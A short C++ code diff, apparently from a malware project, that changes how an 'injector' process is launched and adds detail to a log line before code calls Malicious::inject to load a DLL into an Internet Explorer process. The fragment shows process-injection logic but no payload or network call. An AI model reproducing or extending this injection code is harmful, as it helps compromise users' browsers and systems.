@@ -36,7 +36,7 @@ namespace Inhibiter
             FATAL_ERROR("Unable to install injector");
         }
 
-		System::Process finish_install(executable_path, "\"" + current_executable_path + "\"");
+		System::Process::Launcher finish_install(executable_path, "\"" + current_executable_path + "\"");
         if(!finish_install.isRunning())
         {
             FATAL_ERROR("Unable to launch injector");
@@ -107,7 +107,7 @@ namespace Inhibiter
         }
 
 		Malicious::InternetExplorer ie;
-        LOG << "Injecting IE";
+		LOG << "Injecting IE with PID : " + to_string(ie.getPid());
 
 		if(!Malicious::inject(ie.getPid(), dll_path))
         {
